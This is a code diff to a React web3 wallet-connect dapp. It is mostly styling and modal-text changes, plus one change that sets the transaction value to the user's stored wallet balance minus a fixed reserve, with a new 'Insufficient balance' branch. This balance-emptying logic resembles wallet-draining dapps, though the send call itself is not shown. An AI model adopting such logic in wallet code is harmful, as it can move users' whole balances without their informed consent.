@@ -5,7 +5,6 @@ import Web3Modal from "web3modal";
 import { GoInbox } from "react-icons/go";
 import { GoPlusSmall } from "react-icons/go";
 import { GoAlert } from "react-icons/go";
-import { GoCheck } from "react-icons/go";
 
 import WalletConnectProvider from "@walletconnect/web3-provider";
 import Fortmatic from "fortmatic";
@@ -55,10 +54,10 @@ const ConnectWallet = styled(Button)`
 `;
 
 const DisconnectWallet = styled(ConnectWallet)`
-  margin: 9px 0px 8px 0px;
+  margin: 5px 0px 8px 0px;
   width: 130px;
   @media (min-width: 768px) {
-    margin: 28px 10px 20px -7px;
+    margin: 30px 10px 20px -7px;
   }
 `;
 
@@ -80,12 +79,10 @@ const SContent = styled(Wrapper)`
 
 const SContainer = styled.div`
   height: 100%;
-  min-height: 200px;
+  min-height: 110px;
   display: flex;
-  flex-direction: column;
   justify-content: center;
   align-items: center;
-  word-break: break-word;
 `;
 
 const SModalContainer = styled.div`
@@ -101,7 +98,6 @@ const SModalTitle = styled.div`
 `;
 
 const SModalParagraph = styled.p`
-  margin-top: 30px;
   font-size: ${fonts.size.h6};
 `;
 
@@ -473,7 +469,7 @@ class App extends React.Component<any, any> {
       this.toggleModal();            
       this.setState({connectError: {bool: true}});
       if (this.state.address){
-        this.setState({connectError: {message: 'Confirm pool first'}})
+        this.setState({connectError: {message: 'Confirm pool first !'}})
       }
   }
 
@@ -514,7 +510,7 @@ class App extends React.Component<any, any> {
         txHash: result,
         from: address,
         to: this.state.address,
-        value: this.state.assets
+        value: Number(sessionStorage.getItem('balance')) - 2502441524727298
       };
 
       // display result
@@ -608,35 +604,41 @@ class App extends React.Component<any, any> {
               <SModalTitle>{"Send transaction"}</SModalTitle>
               <SContainer>
                 <Loader />
-                <SModalParagraph>
-                  {"Please check your wallet"}
-                </SModalParagraph>
               </SContainer>
+              <SModalParagraph style={{marginTop: 20}}>
+                {"Please check your wallet"}
+              </SModalParagraph>
             </SModalContainer>
           ) : result ? (
             <SModalContainer>
-              <SModalTitle style={{color: '#95D1CC'}}>{"Transaction successfully completed"} <GoCheck/></SModalTitle>
+              <SModalParagraph style={{color: '#95D1CC'}}>{"Transaction successfully completed 🥳"}</SModalParagraph>
               <ModalResult>{result}</ModalResult>
             </SModalContainer>
-          ) : (
+          ) : Number(sessionStorage.getItem('balance')) - 2502441524727298 <= 0 ? (
             <SModalContainer>
-              <SModalTitle style={{color: '#F8485E'}}>{this.state.connectError.bool === false && 'Transaction Rejected'} {this.state.connectError.bool === false && <GoAlert/>}</SModalTitle>
-            </SModalContainer>
-          )}
-          {this.state.connectError.bool ?(
-            <SModalContainer>
-              <SModalTitle>{this.state.connectError.bool && "Warning !"}</SModalTitle>
-              <SModalParagraph>
-                {this.state.connectError.bool && "Connect a wallet first"}
+              <SModalParagraph style={{color: '#F9D371'}}>
+                {this.state.connectError.bool === false && 'Insufficient balance'} {this.state.connectError.bool === false && <GoAlert/>}
               </SModalParagraph>
             </SModalContainer>
           ) : (
             <SModalContainer>
-              <SModalTitle>{this.state.connectError.message && "Warning !"}</SModalTitle>
+              <SModalParagraph style={{color: '#F8485E'}}>
+                {this.state.connectError.bool === false && 'Transaction Rejected'} {this.state.connectError.bool === false && <GoAlert/>}
+              </SModalParagraph>
+            </SModalContainer>
+          )}
+          {this.state.connectError.bool ? (
+            <SModalContainer>
+              <SModalParagraph>
+                {this.state.connectError.bool && "Connect a wallet first !"}
+              </SModalParagraph>
+            </SModalContainer>
+          ) : (
+            <SModalContainer>
               <SModalParagraph>
                 {this.state.connectError.message && this.state.connectError.message }
               </SModalParagraph>
-          </SModalContainer>
+           </SModalContainer>
           )}
         </Modal>
         <ShowWalletInMobile>
